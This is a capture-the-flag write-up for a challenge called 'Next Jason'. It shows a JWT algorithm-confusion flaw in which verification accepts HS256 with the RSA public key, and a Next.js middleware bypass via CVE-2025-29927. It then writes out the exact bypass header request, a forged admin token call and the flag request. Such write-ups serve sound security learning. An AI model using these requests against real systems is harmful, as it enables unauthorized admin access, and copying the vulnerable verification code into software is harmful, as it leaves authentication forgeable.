#### Next Jason
- points earned: 50

#### Notes
- There is an endpoint `/api/getFlag` which serves the flag.  However, it requires that the user provides a signed JWT for the `admin` user.  If an attacker can obtain a JWT for the `admin` user then they get the flag.
- There is a problem in the way that this app verifies JWT signatures.  The issue is that it allows `RS256` and `HS256` signatures during verification.  If an attacker can obtain the public key then they can forge a JWT by using `HS256` and signing it with the public key.
	```javascript
	function verifyToken(token) {
		return jwt.verify(token, PUBKEY, { algorithms: ['RS256', 'HS256'] });
	}
	```
- The app has an endpoint `/api/getPublicKey` that serves the public key, however, it is protected by middleware.  The middleware allows access to `/api/getPublicKey` if the user provides a valid or a valid JWT`inviteCode`.  If an attacker is able to bypass this middleware then they can obtain the public key.
- This app is vulnerable to `CVE-2025-29927` which effects versions `<14.2.25`.  The next version used in this app is `14.2.24` which can be verified in the `package.json` file.  This CVE allows an attacker to bypass middleware.
	```json
	"dependencies": {
		"jsonwebtoken": "^8.5.1",
		"next": "14.2.24",
		"react": "^18",
		"react-dom": "^18"
	},
	```
- With this combination of weaknesses an attacker can obtain the flag by:
	- using the CVE to bypass middleware and obtain the public key
	- use the public key to craft an admin JWT
	- using the admin JWT to get the flag
#### Solution
- bypass middleware
	```http
	GET /api/getPublicKey HTTP/1.1
	Host: me:3000
	x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
	
	
	```
- craft an admin JWT
	`jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });`
- obtain the flag
	```
	GET /api/getFlag HTTP/1.1
	Host: me:3000
	Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY1MTI5MjIxfQ.JzlBiumXmGc0lfqn8Q9yYk5lMQW7ktdcCMRh8HnQxYY
	
	
	```